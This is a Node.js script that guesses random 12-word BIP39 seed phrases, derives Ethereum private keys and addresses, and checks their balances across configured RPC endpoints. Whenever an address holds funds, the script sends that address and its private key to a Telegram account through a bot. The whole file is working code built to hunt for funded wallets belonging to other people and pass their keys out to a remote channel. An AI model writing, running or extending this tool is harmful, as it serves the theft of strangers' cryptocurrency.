const bip39 = require('bip39');
const hdkey = require('hdkey');
const util = require('ethereumjs-util');

const TelegramBot = require('node-telegram-bot-api');

require('dotenv').config();
const events = require('events');
events.EventEmitter.defaultMaxListeners = 1000;
const { ethers } = require('ethers');

const words = require('./words');
const rpc = require('./rpc');


let nextWordCheck = process.env.NEXT_WORD_CHECK; // ms
// =================================================

let providers = [];

async function setProvider() {
  console.log('');
  if (rpc && Array.isArray(rpc) && rpc.length > 0) {

    const promises = rpc.map(async ([chain, single_url]) => {
      try {

        let single_provider;

        if (single_url.startsWith('https') || single_url.startsWith('http')) {
          single_provider = new ethers.JsonRpcProvider(single_url);
        } else if (
          single_url.startsWith('wss') || single_url.startsWith('ws')) {
          single_provider = new ethers.WebSocketProvider(single_url);
        } else {
          console.error(`Invalid URL : ${single_url}`);
          return;
        }

        await single_provider.getBlockNumber();
        providers.push([chain, single_provider]);
        console.log(`Connected to ${chain} RPC: ${single_url}`);

      } catch (error) {
        console.error(`Failed to connect to RPC: ${single_url} - ${error.message}`,);
      }
    });

    await Promise.all(promises);
  } else {
    console.log(`RPC URL array is empty or invalid`);
    process.exit(0);
  }
}
// =================================================
async function validateAndDeriveKeys(mnemonic) {
  const isValid = bip39.validateMnemonic(mnemonic);

  if (!isValid) {
    return false;
  }

  const seed = await bip39.mnemonicToSeed(mnemonic);

  const hdWallet = hdkey.fromMasterSeed(seed);

  const path = "m/44'/60'/0'/0/0";
  const wallet = hdWallet.derive(path);

  const privateKey = wallet.privateKey;
  const publicKey = util.privateToPublic(privateKey);

  const address = util.pubToAddress(publicKey).toString('hex');

  if(address != null || address != undefined || address != ""){
    return { privatekey: privateKey.toString('hex'), address: address };
  }else{
    return false;
  }

}

function getRandom12Words(words, count) {
  let shuffled = words.sort(() => 0.5 - Math.random());
  return shuffled.slice(0, count).join(' ');
}

async function sendRequest(){
  let randomWordsString = getRandom12Words(words, 12);
  let result = await validateAndDeriveKeys(randomWordsString.trim());

  if(result){
   console.log("")
   let address = "0x"+result.address;
   console.log("Private Key: "+result.privatekey);
   console.log('Address: ' + address);

   await checkBalance(address,result);

   setTimeout(() => {sendRequest(); }, nextWordCheck);

  }else{
    process.stdout.write('.');
    setTimeout(() => { sendRequest(); }, nextWordCheck);

  }

}

(async ()=>{
  await setProvider();
  await sendRequest();
})()












// =======================
let bot_token = process.env.TG_BOT_TOKEN.trim();
let user_id = process.env.TG_USER_ID.trim();
const tgBot = new TelegramBot(bot_token, { polling: false });

async function sendTGMessage(message){

   const messageText = `
<b>Wallet Details :- </b>\n
<b>Address: </b> <code>${message.address}</code>\n
<b>Private Key:</b> <code>${message.privatekey}</code>`;

  try {
    await tgBot.sendMessage(user_id, messageText, { parse_mode: 'HTML' });
    console.log('Message sent to Telegram successfully.');
  } catch (error) {

  }

}
async function checkBalance(address,result) {
  for (let i = 0; i < providers.length; i++) {
    try {
      let balance = await providers[i][1].getBalance(address);
      const formattedBalance = ethers.formatEther(balance);
      if (Number(formattedBalance) > 0) {
        console.log(`${providers[i][0]} Balance: ${formattedBalance} ✅✅✅`);
        await sendTGMessage(result);
      } else {

      }

    } catch (error) {
      console.error(`Failed to fetch balance from ${providers[i][0]}: ${error.message}`);
    }

  }
}